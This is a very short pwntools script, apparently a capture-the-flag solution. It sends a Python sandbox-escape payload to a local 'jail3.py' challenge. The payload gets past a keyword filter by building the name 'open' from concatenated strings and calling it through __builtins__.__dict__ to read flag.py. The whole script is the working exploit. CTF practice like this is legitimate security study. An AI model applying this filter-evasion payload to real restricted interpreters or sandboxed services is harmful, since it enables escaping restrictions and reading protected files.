from pwn import *

c = process('./jail3.py')

c.send(b'__builtins__.__dict__["op"+"en"]("flag.py").read()\n')
print(c.recvall())
